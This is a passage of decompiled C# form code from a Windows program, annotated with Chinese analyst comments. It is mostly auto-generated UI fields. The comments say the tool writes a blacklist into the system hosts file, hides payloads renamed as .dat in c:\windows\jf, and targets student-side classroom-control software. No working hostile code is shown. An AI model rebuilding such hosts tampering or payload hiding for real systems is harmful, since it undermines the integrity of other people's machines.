		// (get) Token: 0x06000079 RID: 121 RVA: 0x000024F4 File Offset: 0x000006F4
		// (set) Token: 0x0600007A RID: 122 RVA: 0x000024FC File Offset: 0x000006FC
		internal virtual RadioButton RadioButton11 { get; set; }

		// Token: 0x17000024 RID: 36
		// (get) Token: 0x0600007B RID: 123 RVA: 0x00002505 File Offset: 0x00000705
		// (set) Token: 0x0600007C RID: 124 RVA: 0x0000250D File Offset: 0x0000070D
		internal virtual GroupBox GroupBox10 { get; set; }

		// Token: 0x17000025 RID: 37
		// (get) Token: 0x0600007D RID: 125 RVA: 0x00002516 File Offset: 0x00000716
		// (set) Token: 0x0600007E RID: 126 RVA: 0x0000A2A4 File Offset: 0x000084A4
		internal virtual Button Button_restorepic
		{
			[CompilerGenerated]
			get
			{
				return this.predicateAttr;
			}
			[CompilerGenerated]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ForgotInfo);
				Button button = this.predicateAttr;
				if (button != null)
				{
					button.Click -= eventHandler;
				}
				this.predicateAttr = value;
				button = this.predicateAttr;
				if (button != null)
				{
					button.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000026 RID: 38
		// (get) Token: 0x0600007F RID: 127 RVA: 0x0000251E File Offset: 0x0000071E
		// (set) Token: 0x06000080 RID: 128 RVA: 0x0000A2E8 File Offset: 0x000084E8
		internal virtual Button Button_selectpic
		{
			[CompilerGenerated]
			get
			{
				return this._ConfigAttr;
			}
			[CompilerGenerated]
			set
			{
				EventHandler eventHandler = new EventHandler(this.VisitInfo);
				Button button = this._ConfigAttr;
				if (button != null)
				{
					button.Click -= eventHandler;
				}
				this._ConfigAttr = value;
				button = this._ConfigAttr;
				if (button != null)
				{
					button.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000027 RID: 39
		// (get) Token: 0x06000081 RID: 129 RVA: 0x00002526 File Offset: 0x00000726
		// (set) Token: 0x06000082 RID: 130 RVA: 0x0000252E File Offset: 0x0000072E
		internal virtual GroupBox GroupBox9 { get; set; }

		// Token: 0x17000028 RID: 40
		// (get) Token: 0x06000083 RID: 131 RVA: 0x00002537 File Offset: 0x00000737
		// (set) Token: 0x06000084 RID: 132 RVA: 0x0000253F File Offset: 0x0000073F
		internal virtual RadioButton RadioButton13 { get; set; }

		// Token: 0x17000029 RID: 41
		// (get) Token: 0x06000085 RID: 133 RVA: 0x00002548 File Offset: 0x00000748
		// (set) Token: 0x06000086 RID: 134 RVA: 0x00002550 File Offset: 0x00000750
		internal virtual RadioButton RadioButton14 { get; set; }

		// Token: 0x1700002A RID: 42
		// (get) Token: 0x06000087 RID: 135 RVA: 0x00002559 File Offset: 0x00000759
		// (set) Token: 0x06000088 RID: 136 RVA: 0x00002561 File Offset: 0x00000761
		internal virtual Label Label11 { get; set; }

		// Token: 0x1700002B RID: 43
		// (get) Token: 0x06000089 RID: 137 RVA: 0x0000256A File Offset: 0x0000076A
		// (set) Token: 0x0600008A RID: 138 RVA: 0x00002572 File Offset: 0x00000772
		internal virtual Label Label12 { get; set; }

		// Token: 0x1700002C RID: 44
		// (get) Token: 0x0600008B RID: 139 RVA: 0x0000257B File Offset: 0x0000077B
		// (set) Token: 0x0600008C RID: 140 RVA: 0x00002583 File Offset: 0x00000783
		internal virtual Label Label13 { get; set; }

		// Token: 0x1700002D RID: 45
		// (get) Token: 0x0600008D RID: 141 RVA: 0x0000258C File Offset: 0x0000078C
		// (set) Token: 0x0600008E RID: 142 RVA: 0x00002594 File Offset: 0x00000794
		internal virtual Label Label15 { get; set; }

		// Token: 0x1700002E RID: 46
		// (get) Token: 0x0600008F RID: 143 RVA: 0x0000259D File Offset: 0x0000079D
		// (set) Token: 0x06000090 RID: 144 RVA: 0x000025A5 File Offset: 0x000007A5
		internal virtual Label Label16 { get; set; }

		// Token: 0x1700002F RID: 47
		// (get) Token: 0x06000091 RID: 145 RVA: 0x000025AE File Offset: 0x000007AE
		// (set) Token: 0x06000092 RID: 146 RVA: 0x000025B6 File Offset: 0x000007B6
		internal virtual GroupBox GroupBox1 { get; set; }

		// Token: 0x17000030 RID: 48
		// (get) Token: 0x06000093 RID: 147 RVA: 0x000025BF File Offset: 0x000007BF
		// (set) Token: 0x06000094 RID: 148 RVA: 0x000025C7 File Offset: 0x000007C7
		internal virtual GroupBox GroupBox2 { get; set; }

		// Token: 0x17000031 RID: 49
		// (get) Token: 0x06000095 RID: 149 RVA: 0x000025D0 File Offset: 0x000007D0
		// (set) Token: 0x06000096 RID: 150 RVA: 0x000025D8 File Offset: 0x000007D8
		internal virtual GroupBox GroupBox3 { get; set; }

		// Token: 0x17000032 RID: 50
		// (get) Token: 0x06000097 RID: 151 RVA: 0x000025E1 File Offset: 0x000007E1
		// (set) Token: 0x06000098 RID: 152 RVA: 0x000025E9 File Offset: 0x000007E9
		internal virtual GroupBox GroupBox7 { get; set; }

		// Token: 0x17000033 RID: 51
		// (get) Token: 0x06000099 RID: 153 RVA: 0x000025F2 File Offset: 0x000007F2
		// (set) Token: 0x0600009A RID: 154 RVA: 0x000025FA File Offset: 0x000007FA
		internal virtual GroupBox GroupBox12 { get; set; }

		// Token: 0x17000034 RID: 52
		// (get) Token: 0x0600009B RID: 155 RVA: 0x00002603 File Offset: 0x00000803
		// (set) Token: 0x0600009C RID: 156 RVA: 0x0000260B File Offset: 0x0000080B
		internal virtual Label Label7 { get; set; }

		// Token: 0x17000035 RID: 53
		// (get) Token: 0x0600009D RID: 157 RVA: 0x00002614 File Offset: 0x00000814
		// (set) Token: 0x0600009E RID: 158 RVA: 0x0000261C File Offset: 0x0000081C
		internal virtual Label Label5 { get; set; }

		// Token: 0x17000036 RID: 54
		// (get) Token: 0x0600009F RID: 159 RVA: 0x00002625 File Offset: 0x00000825
		// (set) Token: 0x060000A0 RID: 160 RVA: 0x0000262D File Offset: 0x0000082D
		internal virtual Label Label9 { get; set; }

		// Token: 0x17000037 RID: 55
		// (get) Token: 0x060000A1 RID: 161 RVA: 0x00002636 File Offset: 0x00000836
		// (set) Token: 0x060000A2 RID: 162 RVA: 0x0000A32C File Offset: 0x0000852C
		internal virtual LinkLabel LinkLabel2
		{
			[CompilerGenerated]
			get
			{
				return this.m_RegAttr;
			}
			[CompilerGenerated]
			set
			{
				LinkLabelLinkClickedEventHandler linkLabelLinkClickedEventHandler = new LinkLabelLinkClickedEventHandler(this.InsertInfo);
				LinkLabel linkLabel = this.m_RegAttr;
				if (linkLabel != null)
				{
					linkLabel.LinkClicked -= linkLabelLinkClickedEventHandler;
				}
				this.m_RegAttr = value;
				linkLabel = this.m_RegAttr;
				if (linkLabel != null)
				{
					linkLabel.LinkClicked += linkLabelLinkClickedEventHandler;
				}
			}
		}

		// Token: 0x17000038 RID: 56
		// (get) Token: 0x060000A3 RID: 163 RVA: 0x0000263E File Offset: 0x0000083E
		// (set) Token: 0x060000A4 RID: 164 RVA: 0x00002646 File Offset: 0x00000846
		internal virtual Label Label14 { get; set; }

		// Token: 0x17000039 RID: 57
		// (get) Token: 0x060000A5 RID: 165 RVA: 0x0000264F File Offset: 0x0000084F
		// (set) Token: 0x060000A6 RID: 166 RVA: 0x00002657 File Offset: 0x00000857
		internal virtual Label Label3 { get; set; }

		// Token: 0x1700003A RID: 58
		// (get) Token: 0x060000A7 RID: 167 RVA: 0x00002660 File Offset: 0x00000860
		// (set) Token: 0x060000A8 RID: 168 RVA: 0x00002668 File Offset: 0x00000868
		internal virtual Label Label6 { get; set; }

		// Token: 0x1700003B RID: 59
		// (get) Token: 0x060000A9 RID: 169 RVA: 0x00002671 File Offset: 0x00000871
		// (set) Token: 0x060000AA RID: 170 RVA: 0x00002679 File Offset: 0x00000879
		internal virtual Label Label17 { get; set; }

		// Token: 0x1700003C RID: 60
		// (get) Token: 0x060000AB RID: 171 RVA: 0x00002682 File Offset: 0x00000882
		// (set) Token: 0x060000AC RID: 172 RVA: 0x0000268A File Offset: 0x0000088A
		internal virtual GroupBox GroupBox6 { get; set; }

		// Token: 0x1700003D RID: 61
		// (get) Token: 0x060000AD RID: 173 RVA: 0x00002693 File Offset: 0x00000893
		// (set) Token: 0x060000AE RID: 174 RVA: 0x0000269B File Offset: 0x0000089B
		internal virtual RadioButton RadioButton8 { get; set; }

		// Token: 0x1700003E RID: 62
		// (get) Token: 0x060000AF RID: 175 RVA: 0x000026A4 File Offset: 0x000008A4
		// (set) Token: 0x060000B0 RID: 176 RVA: 0x000026AC File Offset: 0x000008AC
		internal virtual RadioButton RadioButton7 { get; set; }

		// Token: 0x1700003F RID: 63
		// (get) Token: 0x060000B1 RID: 177 RVA: 0x000026B5 File Offset: 0x000008B5
		// (set) Token: 0x060000B2 RID: 178 RVA: 0x000026BD File Offset: 0x000008BD
		internal virtual Label Label18 { get; set; }

		// Token: 0x17000040 RID: 64
		// (get) Token: 0x060000B3 RID: 179 RVA: 0x000026C6 File Offset: 0x000008C6
		// (set) Token: 0x060000B4 RID: 180 RVA: 0x000026CE File Offset: 0x000008CE
		internal virtual GroupBox GroupBox8 { get; set; }

		// Token: 0x17000041 RID: 65
		// (get) Token: 0x060000B5 RID: 181 RVA: 0x000026D7 File Offset: 0x000008D7
		// (set) Token: 0x060000B6 RID: 182 RVA: 0x000026DF File Offset: 0x000008DF
		internal virtual RadioButton RadioButton15 { get; set; }

		// Token: 0x17000042 RID: 66
		// (get) Token: 0x060000B7 RID: 183 RVA: 0x000026E8 File Offset: 0x000008E8
		// (set) Token: 0x060000B8 RID: 184 RVA: 0x000026F0 File Offset: 0x000008F0
		internal virtual RadioButton RadioButton17 { get; set; }

		// Token: 0x17000043 RID: 67
		// (get) Token: 0x060000B9 RID: 185 RVA: 0x000026F9 File Offset: 0x000008F9
		// (set) Token: 0x060000BA RID: 186 RVA: 0x00002701 File Offset: 0x00000901
		internal virtual Label Label19 { get; set; }

		// Token: 0x17000044 RID: 68
		// (get) Token: 0x060000BB RID: 187 RVA: 0x0000270A File Offset: 0x0000090A
		// (set) Token: 0x060000BC RID: 188 RVA: 0x00002712 File Offset: 0x00000912
		internal virtual Label Label20 { get; set; }

		// Token: 0x17000045 RID: 69
		// (get) Token: 0x060000BD RID: 189 RVA: 0x0000271B File Offset: 0x0000091B
		// (set) Token: 0x060000BE RID: 190 RVA: 0x00002723 File Offset: 0x00000923
		internal virtual RadioButton RadioButton16 { get; set; }

		// Token: 0x17000046 RID: 70
		// (get) Token: 0x060000BF RID: 191 RVA: 0x0000272C File Offset: 0x0000092C
		// (set) Token: 0x060000C0 RID: 192 RVA: 0x00002734 File Offset: 0x00000934
		internal virtual Label Label21 { get; set; }

		// Token: 0x17000047 RID: 71
		// (get) Token: 0x060000C1 RID: 193 RVA: 0x0000273D File Offset: 0x0000093D
		// (set) Token: 0x060000C2 RID: 194 RVA: 0x00002745 File Offset: 0x00000945
		internal virtual GroupBox GroupBox11 { get; set; }

		// Token: 0x17000048 RID: 72
		// (get) Token: 0x060000C3 RID: 195 RVA: 0x0000274E File Offset: 0x0000094E
		// (set) Token: 0x060000C4 RID: 196 RVA: 0x00002756 File Offset: 0x00000956
		internal virtual RadioButton RadioButton19 { get; set; }

		// Token: 0x17000049 RID: 73
		// (get) Token: 0x060000C5 RID: 197 RVA: 0x0000275F File Offset: 0x0000095F
		// (set) Token: 0x060000C6 RID: 198 RVA: 0x00002767 File Offset: 0x00000967
		internal virtual RadioButton RadioButton20 { get; set; }

		// Token: 0x1700004A RID: 74
		// (get) Token: 0x060000C7 RID: 199 RVA: 0x00002770 File Offset: 0x00000970
		// (set) Token: 0x060000C8 RID: 200 RVA: 0x00002778 File Offset: 0x00000978
		internal virtual Label Label22 { get; set; }

		// Token: 0x1700004B RID: 75
		// (get) Token: 0x060000C9 RID: 201 RVA: 0x00002781 File Offset: 0x00000981
		// (set) Token: 0x060000CA RID: 202 RVA: 0x00002789 File Offset: 0x00000989
		internal virtual Label Label23 { get; set; }

		// Token: 0x04000010 RID: 16
		/// <summary>hosts 文件路径：&lt;System&gt;\drivers\etc\hosts</summary>
		private string hosts文件路径;

		// Token: 0x04000011 RID: 17
		/// <summary>hosts 备份路径：同目录下的 hosts-bak</summary>
		private string hosts备份路径;

		// Token: 0x04000012 RID: 18
		/// <summary>程序释放目录：c:\windows\jf，用来藏改名成 .dat 的载荷</summary>
		private string 程序释放目录;

		// Token: 0x04000013 RID: 19
		/// <summary>主页域名：www.zmyxl2008.com</summary>
		private string 主页域名;

		// Token: 0x04000014 RID: 20
		/// <summary>声明了但全工程无引用</summary>
		private string m_DatabaseAttr;

		// Token: 0x04000015 RID: 21
		/// <summary>声明了但全工程无引用</summary>
		private string m_IdentifierAttr;

		// Token: 0x04000016 RID: 22
		/// <summary>hosts 硬编码路径：C:\Windows\System32\drivers\etc\hosts（在线黑名单写这里）</summary>
		private string hosts硬编码路径;

		// Token: 0x04000017 RID: 23
		/// <summary>本次是否真的改过 hosts</summary>
		private bool hosts已改动;

		// Token: 0x04000018 RID: 24
		/// <summary>声明了但全工程无引用</summary>
		private const int m_ClientAttr = 20;

		// Token: 0x04000019 RID: 25
		/// <summary>声明了但全工程无引用</summary>
		private const int productAttr = 1;

		// Token: 0x0400001A RID: 26
		/// <summary>声明了但全工程无引用</summary>
		private const int _PropertyAttr = 2;

		// Token: 0x0400001B RID: 27
		/// <summary>学生端 exe 全路径（电子教室 / ClassManger / REDAgent 之一）</summary>
		private string 学生端路径;

		// Token: 0x0400001C RID: 28
		/// <summary>usb_jianche 的原始值（"off" / "on"）</summary>
		private string USB检查开关值;

		// Token: 0x0400001D RID: 29
		private IContainer _StrategyAttr;

		// Token: 0x0400001E RID: 30
		[AccessedThroughProperty("Button1")]
		[CompilerGenerated]
		private Button m_ConnectionAttr;

		// Token: 0x0400001F RID: 31
		[AccessedThroughProperty("RadioButton1")]
		[CompilerGenerated]
		private RadioButton _MethodAttr;

		// Token: 0x04000020 RID: 32
		[AccessedThroughProperty("RadioButton2")]
		[CompilerGenerated]
		private RadioButton _DecoratorAttr;

		// Token: 0x04000021 RID: 33
		[AccessedThroughProperty("RadioButton4")]
		[CompilerGenerated]
		private RadioButton m_MapAttr;

		// Token: 0x04000022 RID: 34
		[AccessedThroughProperty("RadioButton3")]
		[CompilerGenerated]
		private RadioButton bridgeAttr;

		// Token: 0x04000023 RID: 35
		[AccessedThroughProperty("RadioButton6")]
		[CompilerGenerated]
		private RadioButton _PolicyAttr;

		// Token: 0x04000024 RID: 36
		[CompilerGenerated]
		[AccessedThroughProperty("RadioButton5")]
		private RadioButton composerAttr;

		// Token: 0x04000025 RID: 37
		[AccessedThroughProperty("OpenFileDialog1")]
		[CompilerGenerated]
		private OpenFileDialog repositoryAttr;

		// Token: 0x04000026 RID: 38
		[CompilerGenerated]
		[AccessedThroughProperty("Button2")]
		private Button issuerAttr;

		// Token: 0x04000027 RID: 39
		[CompilerGenerated]
		[AccessedThroughProperty("GroupBox4")]
		private GroupBox objectAttr;

		// Token: 0x04000028 RID: 40
		[CompilerGenerated]
		[AccessedThroughProperty("Label1")]
		private Label _DicAttr;

		// Token: 0x04000029 RID: 41
		[CompilerGenerated]
		[AccessedThroughProperty("TextBox1")]
		private TextBox descriptorAttr;

		// Token: 0x0400002A RID: 42
		[CompilerGenerated]
		[AccessedThroughProperty("Button3")]
		private Button _ClassAttr;

		// Token: 0x0400002B RID: 43
		[AccessedThroughProperty("GroupBox5")]
		[CompilerGenerated]
		private GroupBox m_IndexerAttr;

		// Token: 0x0400002C RID: 44
		[AccessedThroughProperty("pd_new")]
		[CompilerGenerated]
		private TextBox m_StateAttr;

		// Token: 0x0400002D RID: 45
		[CompilerGenerated]
		[AccessedThroughProperty("Label8")]
		private Label m_RegistryAttr;

		// Token: 0x0400002E RID: 46
		[AccessedThroughProperty("Label2")]
		[CompilerGenerated]
		private Label _ConsumerAttr;

		// Token: 0x0400002F RID: 47
		[AccessedThroughProperty("RadioButton10")]
		[CompilerGenerated]
		private RadioButton baseAttr;

		// Token: 0x04000030 RID: 48
		[CompilerGenerated]
		[AccessedThroughProperty("RadioButton9")]
		private RadioButton _TaskAttr;

		// Token: 0x04000031 RID: 49
		[AccessedThroughProperty("Label4")]
		[CompilerGenerated]
		private Label _TestsAttr;

		// Token: 0x04000032 RID: 50
		[CompilerGenerated]
		[AccessedThroughProperty("Label10")]
		private Label interpreterAttr;

		// Token: 0x04000033 RID: 51
		[AccessedThroughProperty("RadioButton12")]
		[CompilerGenerated]
		private RadioButton _HelperAttr;

		// Token: 0x04000034 RID: 52
		[AccessedThroughProperty("RadioButton11")]
		[CompilerGenerated]
		private RadioButton _AnnotationAttr;

		// Token: 0x04000035 RID: 53
		[CompilerGenerated]
		[AccessedThroughProperty("GroupBox10")]
		private GroupBox algoAttr;

		// Token: 0x04000036 RID: 54
		[CompilerGenerated]
		[AccessedThroughProperty("Button_restorepic")]
		private Button predicateAttr;

		// Token: 0x04000037 RID: 55
		[AccessedThroughProperty("Button_selectpic")]
		[CompilerGenerated]
		private Button _ConfigAttr;

		// Token: 0x04000038 RID: 56
		[AccessedThroughProperty("GroupBox9")]
		[CompilerGenerated]
		private GroupBox m_StructAttr;

		// Token: 0x04000039 RID: 57
		[AccessedThroughProperty("RadioButton13")]
		[CompilerGenerated]
		private RadioButton serializerAttr;

		// Token: 0x0400003A RID: 58
		[CompilerGenerated]
		[AccessedThroughProperty("RadioButton14")]
		private RadioButton _ProxyAttr;

		// Token: 0x0400003B RID: 59
		[CompilerGenerated]
		[AccessedThroughProperty("Label11")]
		private Label m_ComparatorAttr;

		// Token: 0x0400003C RID: 60
		[CompilerGenerated]
		[AccessedThroughProperty("Label12")]
		private Label m_RulesAttr;

		// Token: 0x0400003D RID: 61
		[CompilerGenerated]
		[AccessedThroughProperty("Label13")]
		private Label printerAttr;

		// Token: 0x0400003E RID: 62
		[CompilerGenerated]
		[AccessedThroughProperty("Label15")]
		private Label _DefinitionAttr;

		// Token: 0x0400003F RID: 63
		[CompilerGenerated]
		[AccessedThroughProperty("Label16")]
		private Label _InstanceAttr;

		// Token: 0x04000040 RID: 64
		[AccessedThroughProperty("GroupBox1")]
		[CompilerGenerated]
		private GroupBox m_StatusAttr;

		// Token: 0x04000041 RID: 65
		[CompilerGenerated]
		[AccessedThroughProperty("GroupBox2")]
		private GroupBox getterAttr;

		// Token: 0x04000042 RID: 66
		[CompilerGenerated]
		[AccessedThroughProperty("GroupBox3")]
		private GroupBox m_SetterAttr;

		// Token: 0x04000043 RID: 67
		[AccessedThroughProperty("GroupBox7")]
		[CompilerGenerated]
		private GroupBox m_AdvisorAttr;

		// Token: 0x04000044 RID: 68
		[AccessedThroughProperty("GroupBox12")]
		[CompilerGenerated]
		private GroupBox _FactoryAttr;

		// Token: 0x04000045 RID: 69
		[AccessedThroughProperty("Label7")]
		[CompilerGenerated]
		private Label exporterAttr;

		// Token: 0x04000046 RID: 70
		[AccessedThroughProperty("Label5")]
		[CompilerGenerated]
		private Label facadeAttr;

		// Token: 0x04000047 RID: 71
		[AccessedThroughProperty("Label9")]
		[CompilerGenerated]
		private Label reponseAttr;

		// Token: 0x04000048 RID: 72
		[AccessedThroughProperty("LinkLabel2")]
		[CompilerGenerated]
		private LinkLabel m_RegAttr;

		// Token: 0x04000049 RID: 73
		[CompilerGenerated]
		[AccessedThroughProperty("Label14")]
		private Label containerAttr;

		// Token: 0x0400004A RID: 74
		[CompilerGenerated]
		[AccessedThroughProperty("Label3")]
		private Label _RuleAttr;

		// Token: 0x0400004B RID: 75
		[CompilerGenerated]
		[AccessedThroughProperty("Label6")]
		private Label _SystemAttr;

		// Token: 0x0400004C RID: 76
		[CompilerGenerated]
		[AccessedThroughProperty("Label17")]
		private Label mapperAttr;

		// Token: 0x0400004D RID: 77
		[AccessedThroughProperty("GroupBox6")]
		[CompilerGenerated]
		private GroupBox parserAttr;

		// Token: 0x0400004E RID: 78
		[CompilerGenerated]
		[AccessedThroughProperty("RadioButton8")]
		private RadioButton writerAttr;

		// Token: 0x0400004F RID: 79
		[CompilerGenerated]
		[AccessedThroughProperty("RadioButton7")]
		private RadioButton m_ReaderAttr;

		// Token: 0x04000050 RID: 80
		[CompilerGenerated]
		[AccessedThroughProperty("Label18")]
		private Label mappingAttr;

		// Token: 0x04000051 RID: 81
		[CompilerGenerated]
		[AccessedThroughProperty("GroupBox8")]
		private GroupBox _ExpressionAttr;

		// Token: 0x04000052 RID: 82
		[CompilerGenerated]
		[AccessedThroughProperty("RadioButton15")]
		private RadioButton m_ServiceAttr;

		// Token: 0x04000053 RID: 83
		[CompilerGenerated]
		[AccessedThroughProperty("RadioButton17")]
		private RadioButton _GlobalAttr;

		// Token: 0x04000054 RID: 84
		[AccessedThroughProperty("Label19")]
		[CompilerGenerated]
		private Label _ListenerAttr;

		// Token: 0x04000055 RID: 85
		[CompilerGenerated]
		[AccessedThroughProperty("Label20")]
		private Label _RoleAttr;

		// Token: 0x04000056 RID: 86
		[AccessedThroughProperty("RadioButton16")]
		[CompilerGenerated]
		private RadioButton m_CodeAttr;

		// Token: 0x04000057 RID: 87
		[CompilerGenerated]
		[AccessedThroughProperty("Label21")]
		private Label attributeAttr;

		// Token: 0x04000058 RID: 88
		[CompilerGenerated]
		[AccessedThroughProperty("GroupBox11")]
		private GroupBox parameterAttr;

		// Token: 0x04000059 RID: 89
		[CompilerGenerated]
		[AccessedThroughProperty("RadioButton19")]
		private RadioButton testAttr;

		// Token: 0x0400005A RID: 90
		[CompilerGenerated]
		[AccessedThroughProperty("RadioButton20")]
		private RadioButton _TemplateAttr;

		// Token: 0x0400005B RID: 91
		[AccessedThroughProperty("Label22")]
		[CompilerGenerated]
		private Label m_MockAttr;

		// Token: 0x0400005C RID: 92
		[CompilerGenerated]
		[AccessedThroughProperty("Label23")]
		private Label iteratorAttr;

		// Token: 0x0200000C RID: 12
		/// <summary>
		/// 壁纸样式枚举（值同 Win32 的 WallpaperStyle）。ResetInfo 实际没有使用它，
		/// 调壁纸时固定写 "2"（拉伸）。
		/// </summary>
		public enum WallpaperStyle
		{
			// Token: 0x0400005E RID: 94
			Tiled = 1,
			// Token: 0x0400005F RID: 95
			Centered,
			// Token: 0x04000060 RID: 96
			Stretched = 6
		}

		// Token: 0x0200000D RID: 13
		/// <summary>
		/// ClipCursor 用的矩形结构（Left/Top/Right/Bottom，屏幕坐标）。
		/// </summary>
		public struct RECT
		{
			// Token: 0x04000061 RID: 97
			public int Left;

			// Token: 0x04000062 RID: 98
			public int Top;

			// Token: 0x04000063 RID: 99
			public int Right;

			// Token: 0x04000064 RID: 100
			public int Bottom;
		}
	}
}
